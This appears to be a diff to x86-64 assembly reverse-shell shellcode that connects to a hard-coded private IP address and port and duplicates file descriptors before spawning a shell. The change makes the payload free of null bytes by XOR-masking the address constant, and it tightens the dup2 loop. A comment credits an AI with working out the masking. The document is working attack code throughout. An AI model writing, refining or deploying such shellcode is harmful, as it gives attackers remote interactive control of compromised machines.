@@ -25,7 +25,15 @@ xor rdx, rdx ;xor last argument
 
 pop rdi ;pop it
 
-mov rbx, 0xCF01A8C0401F0002 ; push <IP> 8000 AF_INET YOU MAY NEED TO MAKE BIT OPERATIONS HERE IN ORDER TO MAKE THIS PROPER SHELLCODE
+;YOU MAY NEED TO MAKE BIT OPERATIONS HERE IN ORDER TO MAKE THIS PROPER SHELLCODE BECAUSE AF_INET BYTES SUCKS 0002
+; mov rbx, 0xCF01A8C0401F0002 ;mov and push <IP> <port> <address_family> 
+; push rbx
+
+;Example of an IP PORT and Address family Bytes.
+;NOTE: THIS BYTE OPERATION IS TAKEN BY AI WORKS ONLY FOR THE SPECIFIC IP AND PORT THAT THE BYTES DEMONSTRATE
+mov rbx, 0xDE10B9D1510E1113   ; Your target value XORed with 0x1111111111111111
+mov rcx, 0x1111111111111111   ; The mask (completely null-free)
+xor rbx, rcx                  ; rbx is now exactly 0xCF01A8C0401F0002!
 push rbx
 
 mov al, 42 ;connect syscall
@@ -47,8 +55,7 @@ mov sil, r12b ;mov the newfd in the sil
 syscall
 
 dec r12b ;dec the fd
-cmp BYTE r12b, 0x0 ;compare
-jge dup2 ;jump if the fd is greater or equal to 0
+jns dup2 ;Jump if Not Sign
 
 
 ;Time for Shell
